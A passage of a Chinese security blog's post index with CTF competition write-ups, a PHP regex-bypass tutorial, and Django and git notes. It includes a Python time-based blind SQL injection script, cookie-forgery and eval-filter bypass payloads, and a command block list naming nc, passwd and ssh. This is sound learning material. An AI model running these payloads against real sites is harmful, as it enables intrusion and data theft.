C:\\Python27\\Lib\\site-packages\\django\\bin<br>    然后创建项目(相关的参数可以-h显示)<br>    $django-admin startproject django-project<br>    启动项目<br>    $python manage.py 8080<br>    浏览器输入地址显示hello world</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>从例子中先看看Django 默认创建项目的文件列表和代码中相关的配置</p>\n","categories":["Django"],"tags":["Django"]},{"title":"帮人代打的比赛","url":"https://www.xjseck.com/2017/12/28/帮人代打的比赛/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>好久没有更新博客了，这一段时间自己也比较懒，主要还是进行了两次比赛吧，东奔西跑的。也很难让自己沉淀下来。就简单的总结一下比赛的过程，然后发现自己的不足。  </p>\n<h3 id=\"关于比赛\"><a href=\"#关于比赛\" class=\"headerlink\" title=\"关于比赛\"></a>关于比赛</h3><p><strong>CNAS T0832网络安全等级保护测评能力验证与攻防大赛</strong><br><strong>2017年中关村信息安全测评联盟测评能力验证与攻防大赛</strong><br><strong>2017年工业信息安全技能大赛</strong><br>一场比赛,一场懵逼，一场比赛，一场菜。<br>首先说一下第一场比赛感觉和解题过程。<br><img src=\"1.jpg\" alt=\"\"><br><img src=\"4.png\" alt=\"\"><br><img src=\"5.png\" alt=\"\"><br>比赛是在北京双十一当天的下午。进行WEB解题，从技术支撑I春秋就能发现，类似CTF-WEB题，共十道题，难度又长又短吧。比赛当时队伍中也是我一个人在解题，时间上肯定是不够用的。<br><strong>题目一(身份鉴别)</strong><br>直接信息收集 robots.txt获得后台登录界面，然后bp抓包，也该源代码中有提示admin/admin登录成功getflag  </p>\n<p><strong>题目二(安全审计)</strong><br>题目提示是有小黑攻入web服务，放置了app留有后门，通过扫描之后发现access.log和error.log日志文件里面有apk 的地址，下载app进行逆向分析，当时是使用的dex2jar+jd-gui进行反编译的，出现了问题，事后复现了一下，使用jeb这个或者android_kill进行反编译比较方便一些。<br><img src=\"2.png\" alt=\"\"><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\">    public MainActivity() &#123;</span><br><span class=\"line\">        super();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    protected void onCreate(Bundle arg6) &#123;</span><br><span class=\"line\">        int v3 = 56;</span><br><span class=\"line\">        int[] v0 = new int[]&#123;150, 161, 180, 164, 150, 255, 191, 248, 130, 152, 142, 161, 129, 136, 137, 255, 129, 165, 252, 187, 130, 152, 153, 180, 128, 152, 157, 187, 130, 166, 137, 184, 149, 161, 137, 255, 150, 165, 252, 254, 130, 152, 137, 181, 149, 166, 175, 180, 150, 136, 154, 166, 130, 166, 168, 245&#125;;</span><br><span class=\"line\">        int v1;</span><br><span class=\"line\">        for(v1 = 0; v1 &lt; v3; ++v1) &#123;</span><br><span class=\"line\">            v0[v1] ^= 204;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        new String(Base64.decode(v0.toString(), 0));</span><br><span class=\"line\">        super.onCreate(arg6);</span><br><span class=\"line\">        this.setContentView(2130968603);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里就很容易的发现是对204进行异或，只要再进行一次异或就能知道原来的数据<br>Python写一个脚本<br><img src=\"3.png\" alt=\"\"></p>\n<p><strong>题目三(访问控制与授权)</strong></p>\n<ul>\n<li>首先抓包进行分析，cookie中有一个role参数进行base解码s:5:”guest” 所以替换成admin传入得到源代码</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$role = &quot;guest&quot;;</span><br><span class=\"line\">$flag = &quot;flag&#123;???&#125;&quot;;</span><br><span class=\"line\">$auth = false;</span><br><span class=\"line\">if(isset($_COOKIE[&quot;role&quot;]))&#123;</span><br><span class=\"line\">    $role = unserialize(base64_decode($_COOKIE[&quot;role&quot;]));</span><br><span class=\"line\">    if($role === &quot;admin&quot;)&#123;</span><br><span class=\"line\">        $auth = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        $auth = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    $role = base64_encode(serialize($role));</span><br><span class=\"line\">    setcookie(&apos;role&apos;,$role);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($auth)&#123;</span><br><span class=\"line\">    if(isset($_POST[&apos;filename&apos;]))&#123;</span><br><span class=\"line\">        $filename = $_POST[&apos;filename&apos;];</span><br><span class=\"line\">        $data = $_POST[&apos;data&apos;];</span><br><span class=\"line\">        if(preg_match(&apos;[&lt;&gt;?]&apos;, $data)) &#123;</span><br><span class=\"line\">            die(&apos;No No No!&apos;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else &#123;</span><br><span class=\"line\">            $s = implode($data);</span><br><span class=\"line\">            if(!preg_match(&apos;[&lt;&gt;?]&apos;, $s))&#123;</span><br><span class=\"line\">                $flag=&quot;None.&quot;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $rand = rand(1,10000000);</span><br><span class=\"line\">            $tmp=&quot;./uploads/&quot;.md5(time() + $rand).$filename;</span><br><span class=\"line\">            file_put_contents($tmp, $flag);</span><br><span class=\"line\">            echo &quot;your file is in &quot; . $tmp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;</span><br><span class=\"line\">        echo &quot;&lt;br /&gt;there are the source.&lt;br /&gt;&quot;;</span><br><span class=\"line\">        echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&apos;;</span><br><span class=\"line\">        echo htmlspecialchars(str_replace($flag,&apos;flag&#123;???&#125;&apos;,file_get_contents(__FILE__)));</span><br><span class=\"line\">        echo &apos;&lt;/textarea&gt;&apos;;+</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    echo &quot;Sorry. You have no permissions.&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>首先是绕过data里面的值$s = implode($data); 可以看出是数组才有返回值，然后才能过<br><code>if(!preg_match(‘[&lt;&gt;?]’, $s)){</code>应为之前判断也是检测data所以数组可以绕过<br><code>payload filename=1.php&amp;data[]=s &lt; das</code><br>只有加上&lt;&gt;就可以  </p>\n<p><strong>题目四(数据保密存储)</strong>  </p>\n<ul>\n<li>页面很简单就是一个大马的登录界面，这个题说白了就是爆破，但是想了一下组合的可能太多，事后知道是4位数组，爆破出来的话就简单了。</li>\n</ul>\n<p><strong>题目五(漏洞检测)</strong><br><strong>题目</strong>提示网站存在漏洞，但是使用工具却没有发现问题所在，存在问题的参数是phone。<br>打开题目发现是登录注册的题，一般不是存在源码就是注入或者挨个测试参数。<br>简单的测试发现是挨个测试参数的问题，那就着重测试phone参数，最后发现是十六进制。<br>首先注册然后登录<br>check.php 查看此电话号码 有多少人使用，源代码中有提示 admin 的phone<br>之后注册填入phone 用户名不能重复 phone 是数字 不能是字符，猜测0x 的二次注入<br>麻烦的就是每次注册要使用不同的用户。  </p>\n<p>思路整理一下就可以开始撸py脚本了<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import random</span><br><span class=\"line\">import string</span><br><span class=\"line\"># print hex_s</span><br><span class=\"line\"># database=&quot;webdb&quot;</span><br><span class=\"line\">database=&quot;&quot;</span><br><span class=\"line\">#pass c199055fc2c7a66eb257dd3c865398</span><br><span class=\"line\">strstr=&quot;-\\&#123;0123456789abcdefghijklmnopqrstuvwxyz\\&#125;&quot;</span><br><span class=\"line\">for x in range(20,50):</span><br><span class=\"line\">    for z in strstr:</span><br><span class=\"line\">        reg_url=&quot;http://172.16.5.105/register.php&quot;</span><br><span class=\"line\">        username=&apos;mmp&apos;+str(random.randint(9999, 10000000))</span><br><span class=\"line\">        sqlstr=&quot;1 and(if((ascii(substring((select phone from user limit 0,1),%s,1))=%s),sleep(3),1))&quot; %(x,ord(z))</span><br><span class=\"line\">        #sqlstr=&quot;1 and(if((ascii(substring(database(),%s,1))=%s),sleep(3),0))&quot; %(x,z)</span><br><span class=\"line\">        # print sqlstr</span><br><span class=\"line\">        hex_s=&quot;&quot;</span><br><span class=\"line\">        for i in sqlstr:</span><br><span class=\"line\">            hex_s=hex_s+hex(ord(i)).replace(&apos;0x&apos;,&apos;&apos;)</span><br><span class=\"line\">        r_data=&#123;</span><br><span class=\"line\">        &quot;username&quot;:username,</span><br><span class=\"line\">        &quot;password&quot;:&quot;123&quot;,</span><br><span class=\"line\">        &quot;phone&quot;:&quot;0x&quot;+hex_s</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res=requests.post(reg_url, data=r_data,timeout=20)</span><br><span class=\"line\">        # print username</span><br><span class=\"line\">        # print res.content</span><br><span class=\"line\">        #先注册</span><br><span class=\"line\">        log_url=&quot;http://172.16.5.105/login.php&quot;</span><br><span class=\"line\">        log_data=&#123;</span><br><span class=\"line\">            &quot;username&quot;:username,</span><br><span class=\"line\">            &quot;password&quot;:&quot;123&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        S=requests.session()</span><br><span class=\"line\">        l_res=S.post(log_url, data=log_data,timeout=20)</span><br><span class=\"line\">        index_url=&quot;http://172.16.5.105/index.php&quot;</span><br><span class=\"line\">        index_res=S.get(index_url)</span><br><span class=\"line\">        # print index_res.content</span><br><span class=\"line\">        check_url=&quot;http://172.16.5.105/check.php&quot;</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            check_res=S.get(check_url,timeout=3)</span><br><span class=\"line\">        except Exception, e:</span><br><span class=\"line\">            # print sqlstr</span><br><span class=\"line\">            database=database+z</span><br><span class=\"line\">            print database</span><br></pre></td></tr></table></figure></p>\n<p>赛后把这个题目的源代码复现了一下 详细的功能可以看 <a href=\"https://github.com/Huseck/CTF\" target=\"_blank\" rel=\"noopener\">github</a> 测评文件。<br><strong>其他题目</strong><br>当时比赛就一下午的时间，一个人做时间上有点来不及，后面的题目，大概是绕waf注入的题目，没有来得及仔细分析时间就到了。</p>\n<h3 id=\"工控的比赛\"><a href=\"#工控的比赛\" class=\"headerlink\" title=\"工控的比赛\"></a>工控的比赛</h3><p>以前也也没有接触过工控安全，所以赛前准备了一下知识点和方法。<br>比赛地点是在杭州的电子科技大学<br>比赛时间19-21<br>都是从早8:00到晚20:00<br>前两天是PLC硬件的调试和挖掘<br>前期准备就是尝试收集网上的挖掘方法和已知的漏洞exp，工业漏洞安全报告文档等。<br>干货比较十足的是<br>KCon2015 Exploit PLC on the internet.pdf<br>KCon2015 工控系统安全威胁与应对探索.pdf<br><strong>漏洞体现可以从 端口、协议和服务三方面进行体现</strong><br><strong>测试挖掘的方向</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内存溢出区内的操作不正确的限制</span><br><span class=\"line\">• 不正确的输入验证</span><br><span class=\"line\">• 限制目录路径名的不正确规则</span><br><span class=\"line\">• 权限和访问控制</span><br><span class=\"line\">• 信息曝光</span><br><span class=\"line\">• 凭证管理</span><br><span class=\"line\">• 验证不正确</span><br><span class=\"line\">• 资源管理错误</span><br><span class=\"line\">• 页面生成过程中的不正确(跨站脚本)</span><br><span class=\"line\">• 数字错误</span><br><span class=\"line\">SCADA网络安全防范</span><br><span class=\"line\">虽然无法在部署之前了解和检测所有安全漏洞，但可以肯定的是通过采用下面纵深防御措施一定可以主动地减轻攻击者对SCADA网络造成的安全破坏：</span><br><span class=\"line\">• 开发安全策略；</span><br><span class=\"line\">• 实现ACL；</span><br><span class=\"line\">• 使用MAC地址过滤；</span><br><span class=\"line\">• 使用VLAN分段；</span><br><span class=\"line\">• 加强SCADA设备物理安全，包括警报和防撬管理；</span><br><span class=\"line\">• 不允许使用第三方USB及相关存储设备；</span><br><span class=\"line\">• 实现支持SCADA协议防御机制的NIDS/NIPS；</span><br><span class=\"line\">• 整合操作系统和固件升级（包括补丁维护）；</span><br><span class=\"line\">• 实现高强度的加密功能；</span><br><span class=\"line\">• 确保已经准备好二重或三重身份验证策略；</span><br><span class=\"line\">• 确保计划内的内部安全评估得到如期执行；</span><br><span class=\"line\">• 考虑使用工控漏扫ICSscan以及包含fuzzing测试功能的ICSscan定期对工控系统进行安全评估；</span><br><span class=\"line\">• 如果可能的话，使用诸如SSH、DNPsec、TLS、DTLS、SSL、PKI和IPsec之类的保护性协议；</span><br><span class=\"line\">• 如果使用的是拨号调制解调器，那么实现支持活动日志、加密、名字和口令身份验证的增强型安全措施；</span><br><span class=\"line\">• 实现一套SIEM安全信息和事件管理系统来完成日志聚合、日志审查和审计分析；</span><br><span class=\"line\">• 为所有合适的防火墙、交换机、路由器、NIPS和NIDS设备实现可扩展的边界网络策略。</span><br></pre></td></tr></table></figure></p>\n<p>第一天趟了一上午，然后就会宾馆了，主要是熟悉了一下PLC_config控制软件，进行对PLC设备调试一些执行和抓抓包分析一下。<br>第二天发现使用AlphaFuzzer1.6 进行网络协议fuzz结果可以把plc直接跑到宕机。也算是一个漏洞吧，哈哈。<br><img src=\"6.png\" alt=\"\"><br>然后再抓包分析，感觉PLC设备没有什么验证机制，fuzz起来还是能发现它挺脆弱的。<br>然后写文档走人了，没有报进入决赛的希望，什么都不会，在杭电的体育馆中待着还是挺冷的。<br>最后一点SCADA软件检测就更加蒙蔽了。应该算是草草离场了。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>网络安全的趋势感觉要覆盖很广的领域，想要能发现问题，编程技能和基础知识就显得更加的重要了。漏洞挖掘的思路和手段就应该加强，后面学习一下fuzzing的技术和手段，希望以后能沉住气，踏踏实实的走好每一步。最后想要这两场比赛的题目和SCADA软件的可以私聊，一起交流。</p>\n","categories":["比赛"],"tags":["CTF","比赛"]},{"title":"正则调试案例","url":"https://www.xjseck.com/2017/10/27/正则调试案例/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我们在进行正则调试的时候，首先是需要读懂正则表达式的意思，其次是进行绕过或者fuzz，后续的才能能好的绕过。<br>正则调试工具<br><a href=\"https://regexper.com\" target=\"_blank\" rel=\"noopener\">https://regexper.com</a> 生成图进行解读正则表达式<br>调试前的基础<br>PHP 我们一般用的比较多的正则判断函数preg_match()、preg_replace()、preg_filter()等函数。这里我们就介绍preg_match()函数<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</span><br></pre></td></tr></table></figure></p>\n<p>搜索 subject 与 pattern 给定的正则表达式的一个匹配  </p>\n<ol>\n<li>参数说明</li>\n</ol>\n<ul>\n<li>$pattern: 要搜索的模式，字符串形式。</li>\n<li>$subject: 输入字符串。</li>\n<li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本，如果是第一个子模式匹配到的数据也是显示在$matches[0]中;$matches[1] 将包含第一个捕获子组匹配到的文本，以此类推, print_r($matches) 显示匹配的内容。</li>\n<li>$flags：flags 可以被设置为以下标记值：<ul>\n<li>PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li>\n</ul>\n</li>\n<li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)</li>\n</ul>\n<h3 id=\"实例一\"><a href=\"#实例一\" class=\"headerlink\" title=\"实例一\"></a>实例一</h3><p>直接上代码<br><strong>index.php</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by seck.</span><br><span class=\"line\"> * Date: 2017/10/27</span><br><span class=\"line\"> * Time: 20:39</span><br><span class=\"line\"> */</span><br><span class=\"line\">//index.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include &apos;config.php&apos;;</span><br><span class=\"line\">if(isset($_GET[&apos;phpinfo&apos;]))&#123;</span><br><span class=\"line\">    php_info();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&apos;eval&apos;]))&#123;</span><br><span class=\"line\">    $filter = &apos;/_|(.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))|(.php|\\=|\\$)/i&apos;;</span><br><span class=\"line\">    if(preg_match($filter, $_GET[&apos;eval&apos;],$matches))&#123;</span><br><span class=\"line\">        print_r($matches);</span><br><span class=\"line\">        var_dump($_GET[&apos;eval&apos;]);</span><br><span class=\"line\">        exit(&apos;nope&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var_dump($_GET[&apos;eval&apos;]);</span><br><span class=\"line\">    //403 forbidden : system filter</span><br><span class=\"line\">    eval($_GET[&apos;eval&apos;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure></p>\n<p><strong>config.php</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by seck.</span><br><span class=\"line\"> * Date: 2017/10/27</span><br><span class=\"line\"> * Time: 20:39</span><br><span class=\"line\"> */</span><br><span class=\"line\"> //config.php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function php_info()&#123;</span><br><span class=\"line\">    exit(&apos;PHP Version 7.0.18-0ubuntu0.16.10.1&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filter = &quot;/\\||\\/|\\.\\.|config|fwrite|fputs|shutdown|halt|&quot;.</span><br><span class=\"line\">    &quot;reboot|init|rm|mv|cp|remove|rename|copy|grep|nc|unlink|find|&quot;.</span><br><span class=\"line\">    &quot;apt|yum|passwd|chmod|chown|ln|kill|lilo|ssh|telnet/i&quot;;</span><br><span class=\"line\">$implode = implode($_REQUEST);</span><br><span class=\"line\">if(preg_match($filter, $implode))&#123;</span><br><span class=\"line\">    exit(&apos;403 forbidden&apos;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>首先过config的判断比较简单 直接使用system();<br>index.php 的正则才是关键<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$filter = &apos;/_|(.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))|(.php|\\=|\\$)/i&apos;;</span><br></pre></td></tr></table></figure></p>\n<p>首先分析正则是 从大分三大块 全部是6段，可以使用?eval=.php测试显示<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_     |    (.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))    |     (.php|\\=|\\$)</span><br></pre></td></tr></table></figure></p>\n<p>到这里我们应该知道第二大段的有3个子模式，所以在匹配时需要同时满足这三个子模式才能匹配，如果我们能同时满足这个三个子模式也就绕过了。<br>比如<br><code>$filter = &#39;/_|(a)(bb)(c)|(.php|\\=|\\$)/i&#39;;</code><br>测试?eval=abbc 才能匹配<br>最后我们想构造形如?eval=system(‘cat flag.php’); 进行读取flag文件<br>这里我们可以使用%0a绕过 贪婪模式(是可以匹配上也可以没有匹配上)另两个模式就必须要匹配上四种中的一种 第二个大段的正则也就绕过了，但是第三个大模式.php没有绕过<br>这里我们使用linux 的cat+ 命令查看所有的文件内容即可bp抓一下数据包<br><strong>最后的payload:?eval=system(%0a”%0acat+“%0a)</strong><br>我们分析一下怎么绕过第二段模式的 system(%0a 是绕过(.) 接着双引号满足第二个<br>接着是(.*)我们可有可无 最后必须要满足<br>但是运行在windows的环境下，却不能执行成功，也不知道为什么，知道表哥求py一下。</p>\n","categories":["正则"],"tags":["PHP","正则"]},{"title":"git控制管理学习","url":"https://www.xjseck.com/2017/10/27/git控制管理学习/","content":"<h2 id=\"管理github\"><a href=\"#管理github\" class=\"headerlink\" title=\"管理github\"></a>管理github</h2><p>使用git配合管理github仓库<br>首先在github上创建仓库<br><img src=\"1.png\" alt=\"\"><br>然后就是你需要设置自己git的ssh-keys进行对自己github仓库的管理<br>具体设置参考<a href=\"http://www.xjeck.com/2017/09/07/博客的搭建过程/\" target=\"_blank\" rel=\"noopener\">key-add</a><br>之后就是本地创建一个git<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#先创建一个文件夹和远程仓库项目的名称一样然后</span><br><span class=\"line\">$ git init</span><br><span class=\"line\">$ git remote add master https://github.com/Huseck/scan_kill_php_shell.git  指定远程仓库+</span><br><span class=\"line\">$ git remote -v //显示一下信息</span><br><span class=\"line\">$ git pull --rebase master master   获取一下readme.md 的信息</span><br><span class=\"line\">$ git add .   //添加本地文件</span><br><span class=\"line\">$ git commit -m &quot;first push&quot; //保存一下信息</span><br><span class=\"line\">$ git push -u master master  //     上传</span><br><span class=\"line\">//之后的每次文件的改变之后使用</span><br><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m &quot;修改的信息&quot;</span><br><span class=\"line\">$ git push</span><br></pre></td></tr></table></figure></p>\n<p></p><h3>建议以后的推送使用commit 填写修改的信息比较好回滚</h3><br>其他经常使用到的功能<br>git工具下载：<a href=\"https://git-scm.com/download/\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/download/</a><br>配置git信息<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;Your name&quot;</span><br><span class=\"line\">git config --global user.email &quot;Your email&quot;</span><br></pre></td></tr></table></figure><p></p>\n<h3 id=\"1、git本地仓库初始化\"><a href=\"#1、git本地仓库初始化\" class=\"headerlink\" title=\"1、git本地仓库初始化\"></a>1、git本地仓库初始化</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init</span><br><span class=\"line\">git remote remove/add origin git仓库地址</span><br><span class=\"line\">git pull origin master master //取远程主分支</span><br><span class=\"line\">git pull origin Liang Liang //取远程Liang的分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"2、提交远程到仓库\"><a href=\"#2、提交远程到仓库\" class=\"headerlink\" title=\"2、提交远程到仓库\"></a>2、提交远程到仓库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;提交信息&quot;</span><br><span class=\"line\">git push origin MoLiang //提交到远程分支MoLiang</span><br></pre></td></tr></table></figure>\n<h3 id=\"3、分支管理\"><a href=\"#3、分支管理\" class=\"headerlink\" title=\"3、分支管理\"></a>3、分支管理</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch Liang //创建Liang的分支</span><br><span class=\"line\">git branch origin/Liang //创建Liang的远程分支</span><br></pre></td></tr></table></figure>\n<h3 